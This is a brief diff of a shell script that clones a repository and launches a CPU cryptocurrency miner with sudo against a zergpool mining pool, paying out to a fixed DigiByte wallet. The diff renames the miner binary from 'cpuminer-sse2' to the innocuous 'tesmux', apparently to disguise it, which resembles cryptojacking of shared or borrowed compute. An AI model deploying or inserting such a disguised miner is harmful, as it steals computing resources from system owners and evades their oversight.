@@ -7,4 +7,4 @@ sudo git clone https://github.com/dewaagro/repotestedcicilan.git
 cd repotestedcicilan
 chmod +x tesmux
 worker=$(shuf -n 1 -i 1-9999999)
-sudo ./cpuminer-sse2 -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zergpool.com:4563 -u dgb1qmsx84scmqd3eg2uau3f63ywfcspxu02h3agzwc -p c=DGB,mc=GXX/PYRK,ID=$worker
+sudo ./tesmux -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zergpool.com:4563 -u dgb1qmsx84scmqd3eg2uau3f63ywfcspxu02h3agzwc -p c=DGB,mc=GXX/PYRK,ID=$worker
